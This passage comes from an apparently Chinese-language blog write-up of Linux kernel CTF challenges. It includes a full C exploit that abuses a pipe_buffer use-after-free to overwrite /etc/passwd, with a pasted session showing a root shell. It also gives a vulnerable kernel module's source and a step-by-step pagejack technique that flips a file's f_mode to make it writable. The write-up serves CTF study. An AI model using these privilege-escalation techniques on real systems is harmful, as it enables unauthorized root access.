current_cpu = cpu_id;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> count_val;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">sscanf</span>(line, <span class="string">&quot; count: %d&quot;</span>, &amp;count_val) == <span class="number">1</span> &amp;&amp; current_cpu != <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;CPU %d -&gt; count = %d\n&quot;</span>, current_cpu, count_val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> *page;    </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> len;</span><br><span class="line">    <span class="type">const</span> <span class="type">void</span> *ops;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_BUF_FLAG_CAN_MERGE 0x10</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/vuln&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Open /dev/vuln failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    etcpasswd_fd = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (etcpasswd_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Open /etc/passwd failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    obj_alloc();</span><br><span class="line">    obj_free();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create pipe let pipe buffer have UAF</span></span><br><span class="line">    pipe(pipefd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">           ssize_t splice(int fd_in, off_t *_Nullable off_in,</span></span><br><span class="line"><span class="comment">                      int fd_out, off_t *_Nullable off_out,</span></span><br><span class="line"><span class="comment">                      size_t size, unsigned int flags);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">off64_t</span> offset = <span class="number">0</span>;</span><br><span class="line">    splice(etcpasswd_fd, &amp;offset, pipefd[<span class="number">1</span>],  <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">my_evil_pipe_buffer</span>;</span></span><br><span class="line">    obj_read(<span class="keyword">sizeof</span>(my_evil_pipe_buffer), (<span class="type">char</span>*)&amp;my_evil_pipe_buffer);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;[+] .page = %p, .offset = %#x, .len = %#x, .ops = %p, .flags = %#x, .private = %#lx\n&quot;</span>, </span><br><span class="line">        my_evil_pipe_buffer.page,</span><br><span class="line">        my_evil_pipe_buffer.offset,</span><br><span class="line">        my_evil_pipe_buffer.len,</span><br><span class="line">        my_evil_pipe_buffer.ops,</span><br><span class="line">        my_evil_pipe_buffer.flags,</span><br><span class="line">        my_evil_pipe_buffer.private</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Overwrite flags and len</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    my_evil_pipe_buffer.len = <span class="number">0</span>;</span><br><span class="line">    my_evil_pipe_buffer.flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line"></span><br><span class="line">    obj_write(<span class="keyword">sizeof</span>(my_evil_pipe_buffer), (<span class="type">char</span>*)&amp;my_evil_pipe_buffer);</span><br><span class="line"></span><br><span class="line">    obj_read(<span class="keyword">sizeof</span>(my_evil_pipe_buffer), (<span class="type">char</span>*)&amp;my_evil_pipe_buffer);</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;[+] .page = %p, .offset = %#x, .len = %#x, .ops = %p, .flags = %#x, .private = %#lx\n&quot;</span>, </span><br><span class="line">        my_evil_pipe_buffer.page,</span><br><span class="line">        my_evil_pipe_buffer.offset,</span><br><span class="line">        my_evil_pipe_buffer.len,</span><br><span class="line">        my_evil_pipe_buffer.ops,</span><br><span class="line">        my_evil_pipe_buffer.flags,</span><br><span class="line">        my_evil_pipe_buffer.private</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> payload[] = <span class="string">&quot;root:$1$naup$tZAttOyVXnz7BlRCnYsuv/:0:0:root:/root:/bin/sh&quot;</span>;</span><br><span class="line">    <span class="type">int</span> ret = write(pipefd[<span class="number">1</span>], payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Failed to write /etc/passwd&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">~ $ id</span></span><br><span class="line"><span class="comment">uid=1000(ctf) gid=1000 groups=1000</span></span><br><span class="line"><span class="comment">~ $ ./exploit </span></span><br><span class="line"><span class="comment">[+] .page = 0xfffffb04000d4c40, .offset = 0, .len = 0x1, .ops = 0xffffffff8f215320, .flags = 0, .private = 0</span></span><br><span class="line"><span class="comment">[+] .page = 0xfffffb04000d4c40, .offset = 0, .len = 0, .ops = 0xffffffff8f215320, .flags = 0x10, .private = 0</span></span><br><span class="line"><span class="comment">~ $ cat /etc/passwd</span></span><br><span class="line"><span class="comment">root:$1$naup$tZAttOyVXnz7BlRCnYsuv/:0:0:root:/root:/bin/sh:/home/ctf:/bin/sh</span></span><br><span class="line"><span class="comment">~ $ su</span></span><br><span class="line"><span class="comment">Password: </span></span><br><span class="line"><span class="comment">/ # id</span></span><br><span class="line"><span class="comment">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>


<h2 id="pagejack"><a href="#pagejack" class="headerlink" title="pagejack"></a>pagejack</h2><p>obj 是 0x400 大小 (用 kmalloc-1024)<br>這題提供兩個 ioctl<br>一個可以分配 chunk<br>一個可以去對 obj 做寫入  </p>
<p>size 輸入完後會在最後補上 null<br>這是一個越界的 off by null  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/miscdevice.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/mutex.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;r1ru&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_ALLOC   0xf000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_WRITE   0xf001</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_SIZE    0x400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">char</span> *data;</span><br><span class="line">&#125; <span class="type">request_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obj</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> buf[OBJ_SIZE];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">obj</span> *<span class="title">obj</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="title function_">DEFINE_MUTEX</span><span class="params">(module_lock)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">obj_alloc</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    obj = kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> obj), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">obj_write</span><span class="params">(<span class="type">char</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="literal">NULL</span> || size &gt; OBJ_SIZE) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(obj-&gt;buf, data, size) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    obj-&gt;buf[size] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">module_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req;</span><br><span class="line">    <span class="type">long</span> ret;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;req, (<span class="type">void</span> *)arg, <span class="keyword">sizeof</span>(req)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mutex_lock(&amp;module_lock);</span><br><span class="line">    <span class="keyword">switch</span>(cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> CMD_ALLOC:</span><br><span class="line">            ret = obj_alloc();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> CMD_WRITE:</span><br><span class="line">            ret = obj_write(req.data, req.size);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            ret = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mutex_unlock(&amp;module_lock);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">module_fops</span> =</span> &#123;</span><br><span class="line">    .unlocked_ioctl = module_ioctl,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">vuln_dev</span> =</span> &#123;</span><br><span class="line">    .minor = MISC_DYNAMIC_MINOR,</span><br><span class="line">    .name = <span class="string">&quot;vuln&quot;</span>,</span><br><span class="line">    .fops = &amp;module_fops</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">module_initialize</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (misc_register(&amp;vuln_dev) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">module_cleanup</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    misc_deregister(&amp;vuln_dev);</span><br><span class="line">    mutex_destroy(&amp;module_lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(module_initialize);</span><br><span class="line">module_exit(module_cleanup);</span><br></pre></td></tr></table></figure>


<h3 id="pagejack-1"><a href="#pagejack-1" class="headerlink" title="pagejack"></a>pagejack</h3><p>pipe 相關資料可以參考這個<br><a target="_blank" rel="noopener" href="https://hackmd.io/@naup96321/HkS86zu_ex">https://hackmd.io/@naup96321/HkS86zu_ex</a>  </p>
<p>pagejack 目標是放在 pipe_buffer array<br>pipe_inode_info 是 pipe 的 metadata<br>pipe_buffer 則是實際存放 pipe 資料的地方<br>一個 pipe_buffer 會指向一個 page 負責管理  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	struct pipe_inode_info - a linux kernel pipe</span></span><br><span class="line"><span class="comment"> *	@mutex: mutex protecting the whole thing</span></span><br><span class="line"><span class="comment"> *	@rd_wait: reader wait point in case of empty pipe</span></span><br><span class="line"><span class="comment"> *	@wr_wait: writer wait point in case of full pipe</span></span><br><span class="line"><span class="comment"> *	@head: The point of buffer production</span></span><br><span class="line"><span class="comment"> *	@tail: The point of buffer consumption</span></span><br><span class="line"><span class="comment"> *	@head_tail: unsigned long union of @head and @tail</span></span><br><span class="line"><span class="comment"> *	@note_loss: The next read() should insert a data-lost message</span></span><br><span class="line"><span class="comment"> *	@max_usage: The maximum number of slots that may be used in the ring</span></span><br><span class="line"><span class="comment"> *	@ring_size: total number of buffers (should be a power of 2)</span></span><br><span class="line"><span class="comment"> *	@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span></span><br><span class="line"><span class="comment"> *	@tmp_page: cached released page</span></span><br><span class="line"><span class="comment"> *	@readers: number of current readers of this pipe</span></span><br><span class="line"><span class="comment"> *	@writers: number of current writers of this pipe</span></span><br><span class="line"><span class="comment"> *	@files: number of struct file referring this pipe (protected by -&gt;i_lock)</span></span><br><span class="line"><span class="comment"> *	@r_counter: reader counter</span></span><br><span class="line"><span class="comment"> *	@w_counter: writer counter</span></span><br><span class="line"><span class="comment"> *	@poll_usage: is this pipe used for epoll, which has crazy wakeups?</span></span><br><span class="line"><span class="comment"> *	@fasync_readers: reader side fasync</span></span><br><span class="line"><span class="comment"> *	@fasync_writers: writer side fasync</span></span><br><span class="line"><span class="comment"> *	@bufs: the circular array of pipe buffers</span></span><br><span class="line"><span class="comment"> *	@user: the user who created this pipe</span></span><br><span class="line"><span class="comment"> *	@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">	<span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* This has to match the &#x27;union pipe_index&#x27; above */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> head_tail;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="type">pipe_index_t</span> head;</span><br><span class="line">			<span class="type">pipe_index_t</span> tail;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line">	<span class="type">bool</span> poll_usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>[2];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>pipe_buffer 裡面有 page pointer<br>如果能讓 page pointer 指向到同一張 page，就可以有 page level UAF (剛好 page_buffer 第一個元素是 page pointer，只需要有 off by one 或 off by null 就可以成功去作出 page level UAF)  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://elixir.bootlin.com/linux/v6.15.9/source/include/linux/pipe_fs_i.h#L17</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *	@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *	@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *	@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *	@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *	@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *	@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="attack-4"><a href="#attack-4" class="headerlink" title="attack"></a>attack</h3><p>首先先 spray 一段 pipe_buffer<br>接下來 allocate 一個 victim object<br>之後再去 spray 一段 pipe_buffer<br>保證了 pipe_buffer 之中有一個可以用來做 overflow 的 obj  </p>
<p>這邊稍微注意一下，因為我們不知道實際蓋到的 pipe 是哪一個<br>因此需要做一點標記<br>可以在每個 pipe_buffer 上寫入資訊，並每個都 +1<br>首先塞入 4 個作為識別<br>後面塞入一些垃圾做為 padding (8 bytes)，不要讓 pipe_buffer 再讀取用於識別的 bytes 後，不會被 free 掉  </p>
<p>為甚麼是 padding 4 + 8 bytes 呢? 原因是可以看到 struct file<br>當我們打開 file 後會自動分配一個 <code>struct file</code><br>我們目標是將 <code>/etc/passwd</code> 改寫<br>而 <code>/etc/passwd</code> 本身是不可寫的，但如果能將 <code>f_mode</code> 改成可寫，就可以往檔案寫入東西<br>f_mode offset &#x3D; 12<br>如果填入 12 bytes，下次寫入就可以直接寫<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.12/source/include/linux/fs.h#L1035">https://elixir.bootlin.com/linux/v6.13.12/source/include/linux/fs.h#L1035</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">	<span class="type">file_ref_t</span>			f_ref;</span><br><span class="line">	<span class="type">spinlock_t</span>			f_lock;</span><br><span class="line">	<span class="type">fmode_t</span>				f_mode;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>	*<span class="title">f_op</span>;</span></span><br></pre></td></tr></table></figure>

<p>現在排好了 slub 布局以及 obj 後<br>就可以通過 off by null 去覆蓋掉 page pointer<br>接下來通過 read 來去看哪一個 pipe_buffer 現在不屬於原本的 page<br>去找到被改寫的 page 所屬的 pipe_buffer 後，以及現在被指向的 page 後 pipe_buffer<br>我們去釋放掉被指向的 pipe_buffer<br>這樣就有一個 page level 的 UAF 了 (struct page pointer)  </p>
<p>接下來就去 spray <code>/etc/passwd</code> 的 file 結構體，讓 UAF 的 page 被拿走<br>然後去通過 write 對改寫的 page 做寫入，把 f_mode 寫成可寫<br>可以參考<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.12/source/include/linux/fs.h#L116">https://elixir.bootlin.com/linux/v6.13.12/source/include/linux/fs.h#L116</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* file is open for reading */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FMODE_READ		((__force fmode_t)(1 &lt;&lt; 0))</span></span><br><span class="line"><span class="comment">/* file is open for writing */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FMODE_WRITE		((__force fmode_t)(1 &lt;&lt; 1))</span></span><br></pre></td></tr></table></figure>
<p>把他改寫為可以 write 後  </p>
<p>就可以將 <code>/etc/passwd</code> 寫掉來提權了  </p>
<p>PS: 當然實際上有可能發生我們 overlapping 的 page 是我們無法控制的，但在雜訊較低的環境中比較不容易發生，並且該覆蓋的記憶體與控制的 page 很相近，實際上非常有機會蓋到可控 page  </p>
<p>我也有參考這個<br><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/buddy/page-uaf/#stepii-fcntlf_setpipe_sz-pipe_buffer-slub-uaf">https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/buddy/page-uaf/#stepii-fcntlf_setpipe_sz-pipe_buffer-slub-uaf</a>  </p>
<p>最後稍微附註一下 slub 布局(kmalloc-1k)<br>通過 slub-dump 觀察到 (附註一下我這邊 Demo 為了識別方便改 padding 0x87)  </p>
<img src="/2025/10/24/speed-run-r1rn-kernel-challenge/mem1.png" class="">

<p>可以觀察到通過 null byte 會 overwrite 低位<br>讓兩個 pipe_buffer 的 struct page pointer 指向同一塊  </p>
<img src="/2025/10/24/speed-run-r1rn-kernel-challenge/mem2.png" class="">

<img src="/2025/10/24/speed-run-r1rn-kernel-challenge/mem3.png" class="">

<p>至於為甚麼 kmalloc-1k 沒有 Red zone 之類的我還沒研究<br>先放著  </p>
